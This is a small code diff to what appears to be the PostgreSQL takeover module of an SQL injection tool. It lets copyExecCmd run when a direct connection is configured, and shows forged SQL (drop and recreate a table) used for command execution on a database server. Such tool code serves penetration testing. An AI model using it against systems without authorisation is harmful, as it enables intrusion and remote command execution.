@@ -17,6 +17,7 @@ from lib.core.common import isNoneValue
 from lib.core.common import isStackingAvailable
 from lib.core.common import randomStr
 from lib.core.compat import LooseVersion
+from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
@@ -100,7 +101,7 @@ class Takeover(GenericTakeover):
     def copyExecCmd(self, cmd):
         output = None
 
-        if isStackingAvailable():
+        if isStackingAvailable() or conf.direct:
             # Reference: https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
             self._forgedCmd = "DROP TABLE IF EXISTS %s;" % self.cmdTblName
             self._forgedCmd += "CREATE TABLE %s(%s text);" % (self.cmdTblName, self.tblField)
